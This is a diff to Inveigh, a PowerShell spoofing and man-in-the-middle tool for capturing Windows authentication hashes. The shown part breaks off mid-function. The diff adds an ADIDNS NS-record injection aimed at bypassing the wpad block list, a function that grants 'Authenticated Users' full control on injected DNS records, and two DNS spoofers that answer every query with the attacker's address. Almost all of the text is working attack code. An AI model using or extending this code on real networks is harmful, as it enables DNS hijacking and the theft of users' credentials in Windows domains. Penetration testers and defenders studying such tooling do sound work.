@@ -9,8 +9,12 @@ This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS spoofer/man-in-the-
 challenge/response capture over HTTP/HTTPS/Proxy/SMB.
 
 .PARAMETER ADIDNS
-Default = Disabled: (Combo/Wildcard) Enable an ADIDNS spoofing attack. Combo looks at LLMNR/NBNS requests and adds
-a record to DNS if the same request is received from multiple systems. Wildcard injects a wildcard record. 
+Default = None: (Combo/NS/Wildcard) List of ADIDNS spoofing attacks. Combo looks at LLMNR/NBNS requests and adds
+a record to DNS if the same request is received from multiple systems. NS injects an NS record and if needed, a target record.
+this is primarily for the GQBL bypass for wpad. This attack can be used with Inveigh's DNS spoofer. Wildcard injects a wildcard record.
+
+.PARAMETER ADIDNSACE
+Default = Enabled: Enable/Disable adding an 'Authenticated Users' full control ACE to any added records.
 
 .PARAMETER ADIDNSCleanup
 Default = Enabled: Enable/Disable removing added ADIDNS records upon shutdown.
@@ -30,8 +34,11 @@ The targeted forest in DNS format.
 .PARAMETER ADIDNSHostsIgnore
 Comma seperated list of hosts that will be ignored with ADIDNS spoofing.
 
-.PARAMETER ADIPartition
-Default = DomainDNSZones: (DomainDNSZones,ForestDNSZone,System) The AD partition name where the zone is stored.
+.PARAMETER ADIDNSNSTarget
+Default = wpad2: Target for the NS attacks NS record. An existing record can be used. 
+
+.PARAMETER ADIDNSPartition
+Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.
 
 .PARAMETER ADIDNSThreshold
 Default = 4: The threshold used to determine when ADIDNS records are injected for the combo attack. Inveigh will
@@ -62,6 +69,13 @@ displaying full capture lists when running through a shell that does not have ac
 .PARAMETER ConsoleUnique
 Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
 and username combinations when real time console output is enabled.
+
+.PARAMETER DNS
+Default = Enabled: (Y/N) Enable/Disable DNS spoofing. All detected requests will be answered with the SpooferIP.
+This is primarily required for the ADIDNS NS wpad attack.
+
+.PARAMETER DNSTTL
+Default = 30 Seconds: DNS TTL in seconds for the response packet.
 
 .PARAMETER ElevatedPrivilege
 Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh is running with
@@ -401,6 +415,7 @@ param
     [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
     [parameter(Mandatory=$false)][Int]$ADIDNSThreshold = "4",
     [parameter(Mandatory=$false)][Int]$ADIDNSTTL = "600",
+    [parameter(Mandatory=$false)][Int]$DNSTTL = "30",
     [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
     [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
     [parameter(Mandatory=$false)][Int]$KerberosCount = "2",
@@ -419,6 +434,8 @@ param
     [parameter(Mandatory=$false)][String]$ADIDNSDomain = "",
     [parameter(Mandatory=$false)][String]$ADIDNSDomainController = "",
     [parameter(Mandatory=$false)][String]$ADIDNSForest = "",
+    [parameter(Mandatory=$false)][String]$ADIDNSNS = "wpad",
+    [parameter(Mandatory=$false)][String]$ADIDNSNSTarget = "wpad2",
     [parameter(Mandatory=$false)][String]$ADIDNSZone = "",
     [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "IIS",
     [parameter(Mandatory=$false)][String]$HTTPContentType = "text/html",
@@ -431,9 +448,11 @@ param
     [parameter(Mandatory=$false)][String]$WPADResponse = "",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Combo","Wildcard")][String]$ADIDNS,
+    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$ADIDNS,
     [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$ADIDNSPartition = "DomainDNSZones",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSACE = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSCleanup = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DNS = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$EvadeRG = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
@@ -489,7 +508,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.5"
+$inveigh_version = "1.5 Dev"
 
 if(!$IP)
 { 
@@ -591,13 +610,13 @@ if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
     throw
 }
 
-if(!$FileOutputdirectory)
+if(!$FileOutputDirectory)
 { 
     $output_directory = $PWD.Path
 }
 else
 {
-    $output_directory = $FileOutputdirectory
+    $output_directory = $FileOutputDirectory
 }
 
 if(!$inveigh)
@@ -701,6 +720,12 @@ if($StartupChecks -eq 'Y')
         $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
     }
 
+    if($DNS -eq 'Y' -and !$elevated_privilege)
+    {
+        $DNS_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
+        $DNS_port_check = $false
+    }
+
     if($LLMNR -eq 'Y' -and !$elevated_privilege)
     {
         $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
@@ -778,6 +803,7 @@ if($Inspect)
 
     if($elevated_privilege)
     {
+        $DNS = "N"
         $LLMNR = "N"
         $mDNS = "N"
         $NBNS = "N"
@@ -888,7 +914,7 @@ if($firewall_status)
 
 $inveigh.output_queue.Add("[+] Primary IP Address = $IP")  > $null
 
-if($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
+if($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
 {
     $inveigh.output_queue.Add("[+] Spoofer IP Address = $SpooferIP")  > $null
 }
@@ -919,6 +945,21 @@ if($ADIDNS)
     $inveigh.output_queue.Add("[+] ADIDNS TTL = $ADIDNSTTL")  > $null
     $inveigh.output_queue.Add("[+] ADIDNS Zone = $ADIDNSZone")  > $null
 
+    if($inveigh.ADIDNS -contains 'NS')
+    {
+        $inveigh.output_queue.Add("[+] ADIDNS NS Record = $ADIDNSNS")  > $null
+        $inveigh.output_queue.Add("[+] ADIDNS NS Target Record = $ADIDNSNSTarget")  > $null
+    }
+
+    if($ADIDNSACE -eq 'Y')
+    {
+        $inveigh.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
+    }
+    else
+    {
+        $inveigh.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
+    }
+
     if($ADIDNSCleanup -eq 'Y')
     {
         $inveigh.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
@@ -937,6 +978,27 @@ if($ADIDNS)
 else
 {
     $inveigh.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
+}
+
+if($DNS -eq 'Y')
+{
+
+    if($elevated_privilege -or !$DNS_port_check)
+    {
+        $inveigh.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
+        $inveigh.output_queue.Add("[+] DNS TTL = $DNSTTL Seconds")  > $null
+    }
+    else
+    {
+        $DNS = "N"
+        $inveigh.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
+    }
+
+}
+else
+{
+    $inveigh.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
+    $DNS_response_message = "[spoofer disabled]"
 }
 
 if($LLMNR -eq 'Y')
@@ -1142,8 +1204,8 @@ if($HTTPS -eq 'Y')
         { 
             $inveigh.certificate_issuer = $HTTPSCertIssuer
             $inveigh.certificate_CN = $HTTPSCertSubject
-            $inveigh.output_queue.Add("HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
-            $inveigh.output_queue.Add("HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
+            $inveigh.output_queue.Add("[+] HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
+            $inveigh.output_queue.Add("[+] HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
             $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
 
             if(!$certificate_check)
@@ -1456,7 +1518,7 @@ else
     $inveigh.console_unique = $false
 }
 
-if($FileOutput -eq 'Y' -or $KerberosCount -gt 0 -or ($PcapOutput -eq 'File' -and ($PcapPortTCP -or $PcapPortUDP)))
+if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($PcapOutput -eq 'File' -and ($PcapPortTCP -or $PcapPortUDP)))
 {
     
     if($FileOutput -eq 'Y')
@@ -1983,7 +2045,7 @@ $ADIDNS_functions_scriptblock =
             $distinguished_name += ",DC=$DC"
         }
 
-        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -TTL $TTL -Zone $Zone
+        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone
 
         if($Credential)
         {
@@ -2000,12 +2062,7 @@ $ADIDNS_functions_scriptblock =
             $directory_entry.SetInfo()
             $success = $true
             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node added to $Zone") > $null;
-
-            if($inveigh.ADIDNS -eq 'Combo')
-            {
-                $inveigh.ADIDNS_table.$Node = "1"
-            }
-
+            $inveigh.ADIDNS_table.$Node = "1"
         }
         catch
         {
@@ -2013,12 +2070,7 @@ $ADIDNS_functions_scriptblock =
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-
-            if($inveigh.ADIDNS -eq 'Combo')
-            {
-                $inveigh.ADIDNS_table.$Node = "0"
-            }
-
+            $inveigh.ADIDNS_table.$Node = "0"
         }
 
         if($directory_entry.Path)
@@ -2103,6 +2155,89 @@ $ADIDNS_functions_scriptblock =
 
         return $node_tombstoned
     }
+
+    function Grant-ADIDNSPermission
+    {
+        [CmdletBinding()]
+        param
+        (
+            [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
+            "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
+            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$Access = "GenericAll",
+            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
+            [parameter(Mandatory=$false)][String]$DistinguishedName,
+            [parameter(Mandatory=$false)][String]$Domain,
+            [parameter(Mandatory=$false)][String]$DomainController,
+            [parameter(Mandatory=$false)][String]$Node,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$Principal,
+            [parameter(Mandatory=$false)][String]$Zone,
+            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
+            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
+        )
+
+        if($Partition -eq 'System')
+        {
+            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
+        }
+        else
+        {
+            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
+        }
+
+        $DC_array = $Domain.Split(".")
+
+        ForEach($DC in $DC_array)
+        {
+            $distinguished_name += ",DC=$DC"
+        }
+
+        if($Credential)
+        {
+            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+        }
+        else
+        {
+            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
+        }
+
+        try
+        {
+            $NT_account = New-Object System.Security.Principal.NTAccount($Principal)
+            $principal_SID = $NT_account.Translate([System.Security.Principal.SecurityIdentifier])
+            $principal_identity = [System.Security.Principal.IdentityReference]$principal_SID
+            $AD_rights = [System.DirectoryServices.ActiveDirectoryRights]$Access
+            $access_control_type = [System.Security.AccessControl.AccessControlType]$Type
+            $AD_security_inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
+            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($principal_identity,$AD_rights,$access_control_type,$AD_security_inheritance)
+        }
+        catch
+        {
+            $error_message = $_.Exception.Message
+            $error_message = $error_message -replace "`n",""
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        }
+
+        try
+        {
+            $directory_entry.psbase.ObjectSecurity.AddAccessRule($ACE)
+            $directory_entry.psbase.CommitChanges()
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $Principal to $Node DACL") > $null
+        }
+        catch
+        {
+            $error_message = $_.Exception.Message
+            $error_message = $error_message -replace "`n",""
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        }
+
+        if($directory_entry.Path)
+        {
+            $directory_entry.Close()
+        }
+
+        return $output
+    }
     
     function New-ADIDNSNode
     {
@@ -2132,7 +2267,7 @@ $ADIDNS_functions_scriptblock =
             $distinguished_name += ",DC=$DC"
         }
 
-        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -TTL $TTL -Zone $Zone
+        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone
         $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)
 
         if($Credential)
@@ -2164,14 +2299,9 @@ $ADIDNS_functions_scriptblock =
             $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$DNSRecord)) > $null
             $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
             $connection.SendRequest($request) > $null
-            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node added to $Zone") > $null
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node type $Type added to $Zone") > $null
             $output = $true
-
-            if($inveigh.ADIDNS -eq 'Combo')
-            {
-                $inveigh.ADIDNS_table.$Node = "1"
-            }
-
+            $inveigh.ADIDNS_table.$Node = "1"
         }
         catch
         {
@@ -2183,10 +2313,6 @@ $ADIDNS_functions_scriptblock =
             {
                 $inveigh.ADIDNS = $null
                 $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-            }
-
-            if($inveigh.ADIDNS -eq 'Combo')
-            {
                 $inveigh.ADIDNS_table.$Node = "0"
             }
 
@@ -2512,7 +2638,8 @@ $ADIDNS_functions_scriptblock =
             [parameter(Mandatory=$false)][String]$DomainController,
             [parameter(Mandatory=$false)][String]$Forest,
             [parameter(Mandatory=$true)][String]$Node,
-            [parameter(Mandatory=$false)]$Partition,
+            [parameter(Mandatory=$false)][String]$Partition,
+            [parameter(Mandatory=$false)][String]$Type,
             [parameter(Mandatory=$false)][String]$Zone,
             [parameter(Mandatory=$false)][Int]$TTL,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
@@ -2520,7 +2647,7 @@ $ADIDNS_functions_scriptblock =
 
         try
         {
-            $node_added = New-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $Node -Partition $Partition -TTL $TTL -Zone $Zone
+            $node_added = New-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone
 
             if($inveigh.ADIDNS -and !$node_added)
             {
@@ -2528,7 +2655,7 @@ $ADIDNS_functions_scriptblock =
 
                 if($node_tombstoned)
                 {
-                    Enable-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -TTL $TTL -Zone $Zone
+                    Enable-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone
                 }
 
             }
@@ -2578,7 +2705,7 @@ $ADIDNS_functions_scriptblock =
                 
                 if($Ignore -NotContains $request -and !$inveigh.ADIDNS_table.$request)
                 {    
-                    Invoke-ADIDNSSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -TTL $TTL -Zone $Zone
+                    Invoke-ADIDNSSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -Type 'A' -TTL $TTL -Zone $Zone
                 }
                 elseif($Ignore -Contains $request)
                 {
@@ -3425,7 +3552,6 @@ $HTTP_scriptblock =
 
     $HTTP_running = $true
     $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
-    $HTTP_client_close = $true
    
     if($proxy_listener)
     {
@@ -3439,8 +3565,11 @@ $HTTP_scriptblock =
     }
     catch
     {
-        $HTTP_running = $false
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $HTTP_running = $false
     }
 
     if($Kerberos -eq 'Y')
@@ -3474,30 +3603,41 @@ $HTTP_scriptblock =
         $HTTP_request_raw_URL = $null
         $NTLM = "NTLM"
 
-        while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
+        if(!$HTTP_client.Connected -and $inveigh.running)
         {
+            $HTTP_client_close = $false
+            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)
 
-            Start-Sleep -m 10
-
-            if(!$inveigh.running)
+            do
             {
-                break HTTP_listener_loop
+
+                if(!$inveigh.running)
+                {
+                    break HTTP_listener_loop
+                }
+
+                Start-Sleep -m 10
             }
-        
-        }
+            until($HTTP_async.IsCompleted)
 
-        if($HTTPS_listener)
-        {
+            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)
             
-            if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.running)
+            if($HTTPS_listener)
             {
-                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
-	            $HTTP_clear_stream = $HTTP_client.GetStream()
+                $HTTP_clear_stream = $HTTP_client.GetStream()
                 $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                 $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})
                 $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
             }
+            else
+            {
+                $HTTP_stream = $HTTP_client.GetStream()
+            }
+            
+        }
 
+        if($HTTPS_listener)
+        {
             [Byte[]]$SSL_request_bytes = $null
 
             do 
@@ -3511,29 +3651,12 @@ $HTTP_scriptblock =
         else
         {
             
-            if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.running)
+            do
             {
-                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
-                $HTTP_stream = $HTTP_client.GetStream()
-            }
-
-            if($HTTP_stream.DataAvailable)
-            {
-                $HTTP_data_available = $true
-
-                do
-                {
-                    $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
-                }until(!$HTTP_stream.DataAvailable)
-
-            }
-            else
-            {
-                $HTTP_data_available = $false
-            }
+                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
+            } while ($HTTP_stream.DataAvailable)
 
             $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
-            $inveigh.blah += $TCP_request
         }
 
         if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
@@ -3571,7 +3694,11 @@ $HTTP_scriptblock =
             {
                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) request for $HTTP_request_raw_URL received from $HTTP_source_IP`:$HTTP_source_port") > $null
                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP`:$HTTP_source_port") > $null
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent") > $null
+
+                if($HTTP_header_user_agent)
+                {
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent") > $null
+                }
 
                 if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                 {
@@ -3619,7 +3746,6 @@ $HTTP_scriptblock =
                 }
 
                 $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
-                $HTTP_client_close = $false
             }
             
             if($TCP_request -like "50-4f-53-54*")
@@ -3979,10 +4105,9 @@ $HTTP_scriptblock =
                 $HTTP_reset = 0
             }
 
-            if($HTTP_data_available -or $HTTP_connection_header_close -or $HTTP_reset -gt 20)
+            if($HTTP_connection_header_close -or $HTTP_reset -gt 20)
             {
                 $HTTP_client.Close()
-                $HTTP_client_close = $true
                 $HTTP_reset = 0
             }
             else
@@ -3995,23 +4120,18 @@ $HTTP_scriptblock =
     }
 
     $HTTP_client.Close()
-    start-sleep -s 1
-    $HTTP_listener.Server.Blocking = $false
-    Start-Sleep -s 1
-    $HTTP_listener.Server.Close()
-    Start-Sleep -s 1
     $HTTP_listener.Stop()
 }
 
 # Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
 $sniffer_scriptblock = 
 {
-    param ($EvadeRG,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,$LLMNR_response_message,
-            $LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,$NBNS_response_message,$NBNSTTL,
-            $NBNSTypes,$output_directory,$PcapOutput,$PcapPortTCP,$PcapPortUDP,$SMB,$SpooferHostsIgnore,
-            $SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,
-            $SpooferLearningDelay,$SpooferLearningInterval,$SpooferNonprintable,$SpooferThresholdHost,
-            $SpooferThresholdNetwork)
+    param ($DNS,$DNSTTL,$DNS_response_message,$EvadeRG,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,
+            $LLMNR_response_message,$LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,
+            $NBNS_response_message,$NBNSTTL,$NBNSTypes,$output_directory,$PcapOutput,$PcapPortTCP,$PcapPortUDP,
+            $SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,
+            $SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,$SpooferNonprintable,
+            $SpooferThresholdHost,$SpooferThresholdNetwork)
 
     $sniffer_running = $true
     $byte_in = New-Object System.Byte[] 4	
@@ -4047,11 +4167,16 @@ $sniffer_scriptblock =
     catch
     {
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         $sniffer_running = $false
     }
 
     $sniffer_socket.Bind($end_point)
     $sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
+    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)
+    [Array]::Reverse($DNS_TTL_bytes)
     $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
     [Array]::Reverse($LLMNR_TTL_bytes)
     $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
@@ -4307,6 +4432,76 @@ $sniffer_scriptblock =
                 # Incoming packets 
                 switch($destination_port)
                 {
+
+                    53 # DNS
+                    {
+                        $UDP_length[0] += $payload_bytes.Length - 2
+                        $DNS_response_data = $payload_bytes[12..$payload_bytes.Length]
+                        $DNS_response_type = "[+]"
+
+                        $DNS_response_data += $DNS_response_data +
+                                                $DNS_TTL_bytes +
+                                                0x00,0x04 +
+                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
+        
+                        $DNS_response_packet = 0x00,0x35 +
+                                                    $source_port[1,0] +
+                                                    $UDP_length[1,0] +
+                                                    0x00,0x00 +
+                                                    $payload_bytes[0,1] +
+                                                    0x84,0x80,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
+                                                    $DNS_response_data
+            
+                        $dns_length = $payload_bytes[12]
+
+                        if($dns_length -gt 0)
+                        {
+                            $i = 0
+                            $DNS_index = 12
+                            $DNS_query_string = ''
+
+                            do
+                            {
+                                $DNS_query_string += [System.Text.Encoding]::UTF8.GetString($payload_bytes[($DNS_index + 1)..($DNS_index + $dns_length)])
+                                $DNS_index += $DNS_length + 1
+                                $DNS_length = $payload_bytes[$DNS_index]
+                                $i++
+
+                                if($DNS_length -gt 0)
+                                {
+                                    $DNS_query_string += "."
+                                }
+
+                            }
+                            until($DNS_length -eq 0 -or $i -eq 5)
+                            
+                        }
+
+                        if($DNS -eq 'Y')
+                        {
+
+                            if($IP -ne $source_IP)
+                            {
+                                $DNS_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                $DNS_send_socket.SendBufferSize = 1024
+                                $DNS_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
+                                $DNS_send_socket.SendTo($DNS_response_packet,$DNS_destination_point) > $null
+                                $DNS_send_socket.Close()
+                                $DNS_response_message = "[response sent]"
+                            }
+                            elseif($IP -eq $source_IP)
+                            {
+                                $DNS_response_message = "[local query]"
+                            }
+                            else
+                            {
+                                $DNS_response_message = "[something went wrong]"
+                            }
+
+                        }
+
+                        $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
+                    }
 
                     137 # NBNS
                     {
@@ -4802,6 +4997,107 @@ $sniffer_scriptblock =
     $pcap_file.Close()
 }
 
+# Unprivileged DNS Spoofer ScriptBlock 
+$DNS_spoofer_scriptblock = 
+{
+    param ($Inspect,$DNSTTL,$DNS_response_message,$SpooferIP)
+
+    $DNS_running = $true
+    $DNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)
+
+    try
+    {
+        $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
+    }
+    catch
+    {
+        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $DNS_running = $false
+    }
+
+    $DNS_UDP_client.Client.ReceiveTimeout = 5000
+    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)
+    [Array]::Reverse($DNS_TTL_bytes)
+
+    while($inveigh.running -and $DNS_running)
+    {   
+
+        try
+        {
+            $DNS_request_data = $DNS_UDP_client.Receive([Ref]$DNS_listener_endpoint)
+        }
+        catch
+        {
+            $DNS_UDP_client.Close()
+            $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
+            $DNS_UDP_client.Client.ReceiveTimeout = 5000
+        }
+        
+        if($DNS_request_data -and [System.BitConverter]::ToString($DNS_request_data[10..11]) -ne '00-01')
+        {
+            $DNS_response_packet = $DNS_request_data[0,1] +
+                                    0x84,0x80,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
+                                    $DNS_request_data[12..($DNS_request_data.Length - 5)] +
+                                    0x00,0x01,0x00,0x01 +
+                                    $DNS_TTL_bytes +
+                                    0x00,0x04 +
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
+            
+            $dns_length = $DNS_request_data[12]
+
+            if($dns_length -gt 0)
+            {
+                $i = 0
+                $DNS_index = 12
+                $DNS_query_string = ''
+
+                do
+                {
+                    $DNS_query_string += [System.Text.Encoding]::UTF8.GetString($DNS_request_data[($DNS_index + 1)..($DNS_index + $dns_length)])
+                    $DNS_index += $DNS_length + 1
+                    $DNS_length = $DNS_request_data[$DNS_index]
+                    $i++
+
+                    if($DNS_length -gt 0)
+                    {
+                        $DNS_query_string += "."
+                    }
+
+                }
+                until($DNS_length -eq 0 -or $i -eq 5)
+                
+            }
+
